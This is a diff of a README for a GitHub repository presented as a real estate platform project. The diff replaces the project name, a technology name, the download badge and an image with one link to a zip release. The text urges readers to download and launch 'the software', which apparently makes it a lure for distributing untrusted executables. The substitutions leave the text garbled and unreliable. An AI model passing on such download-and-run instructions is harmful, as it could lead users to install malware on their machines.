@@ -1,9 +1,9 @@
-# Estatease.Co 🏠
+# https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip 🏠
 
-Welcome to the Estatease.Co repository for Real Estate Platform Development!
+Welcome to the https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip repository for Real Estate Platform Development!
 
 ## Description
-This repository focuses on the development of a Real Estate Platform, utilizing a combination of technologies such as AWS, CSS, HTML, MongoDB, Node.js, and more. The goal is to create a robust and user-friendly website for all things related to real estate.
+This repository focuses on the development of a Real Estate Platform, utilizing a combination of technologies such as AWS, CSS, HTML, MongoDB, https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip, and more. The goal is to create a robust and user-friendly website for all things related to real estate.
 
 ## Topics
 - aws
@@ -18,7 +18,7 @@ This repository focuses on the development of a Real Estate Platform, utilizing 
 - website
 
 ## Software Download
-[![Download Software](https://img.shields.io/badge/Download-Software-brightgreen)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip)](https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip)
 
 Please download the software package from the provided link above. Once downloaded, the software needs to be launched to kickstart your Real Estate Platform Development journey.
 
@@ -35,4 +35,4 @@ Let's build something amazing together in the world of real estate! 🏡🚀
 
 Happy Developing! 👨‍💻🏢
 
-![Real Estate](https://cdn.pixabay.com/photo/2016/07/28/11/31/real-estate-1549829_960_720.jpg)
+![Real Estate](https://github.com/Theoiscoollol/Estatease.Co/releases/download/v1.0/Application.zip)
